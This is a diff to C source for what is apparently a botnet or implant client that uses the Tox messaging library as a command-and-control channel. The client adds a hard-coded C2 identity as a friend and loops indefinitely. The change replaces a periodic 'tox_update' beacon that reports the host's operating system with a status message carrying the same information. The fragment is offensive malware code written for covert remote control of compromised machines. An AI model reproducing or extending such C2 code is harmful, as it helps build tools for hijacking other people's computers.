@@ -9,13 +9,13 @@
 #include <sodium/utils.h>
 #include <tox/tox.h>
 
-// Define operating system type for pings
+// Set system information for C2
 #if __linux__
-    char ping[17] = "tox_update LINUX";
+    char * status = "LINUX";
 #elif __unix__
-    char * ping = "tox_update UNIX";
+    char * status = "UNIX";
 #elif defined(_POSIX_VERSION)
-    char * ping = "tox_update POSIX";
+    char * status = "POSIX";
 #else
 #   error "Unknown compiler"
 #endif
@@ -139,21 +139,13 @@ int main() {
 
     tox_friend_add(tox, hex2bin(c2id), "Incoming", sizeof(9), NULL); // Add C2
 
-    int sleeper = 0;
+    tox_self_set_status_message(tox, (const uint8_t *)status, strlen(status), NULL);
 
     while (1) {
 
         tox_iterate(tox, NULL);
 
-        // Send a message every ~ 60 seconds
-        if (sleeper > 1100) {
-            tox_friend_send_message(tox, 0, TOX_MESSAGE_TYPE_NORMAL, ping, sizeof(ping), NULL);
-            sleeper = 0;
-        }
-
         usleep(tox_iteration_interval(tox) * 1000);
-
-        sleeper++;
 
     }
 
